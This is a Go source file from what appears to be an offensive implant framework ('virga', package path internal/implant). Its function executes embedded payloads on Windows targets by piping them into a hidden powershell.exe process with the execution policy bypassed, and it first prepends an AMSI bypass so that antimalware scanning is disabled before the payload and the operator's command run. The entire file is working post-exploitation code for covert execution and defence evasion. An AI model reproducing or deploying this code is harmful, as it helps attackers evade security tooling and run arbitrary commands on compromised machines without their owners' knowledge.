//go:build windows

package shell

import (
	"bytes"
	"fmt"
	"os/exec"
	"strings"
	"syscall"

	"github.com/r74tech/virga/internal/implant/payloads"
)

// executePowerShellPayload streams embedded data through powershell.exe on Windows targets.
func executePowerShellPayload(payload *payloads.EmbeddedPayload, userCommand string) (string, int, error) {
	psPath, err := exec.LookPath("powershell.exe")
	if err != nil {
		return "", 1, fmt.Errorf("powershell executable not found: %w", err)
	}

	cmd := exec.Command(psPath, "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "-")
	var stdin bytes.Buffer

	amsi := payloads.GetPowerShellAmsiBypass()
	if amsi != "" {
		stdin.WriteString(amsi)
		if !strings.HasSuffix(amsi, "\n") {
			stdin.WriteByte('\n')
		}
	}

	stdin.Write(payload.Content)
	if len(payload.Content) == 0 || payload.Content[len(payload.Content)-1] != '\n' {
		stdin.WriteByte('\n')
	}

	if userCommand != "" {
		stdin.WriteString(userCommand)
		if !strings.HasSuffix(userCommand, "\n") {
			stdin.WriteByte('\n')
		}
	}

	// Ensure PowerShell terminates cleanly once the command finishes
	stdin.WriteString("exit\n")
	cmd.Stdin = &stdin

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			return fmt.Sprintf("command execution error: %v", err), 1, err
		}
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		if output != "" {
			output += "\n"
		}
		output += stderr.String()
	}

	return strings.TrimSpace(output), exitCode, nil
}
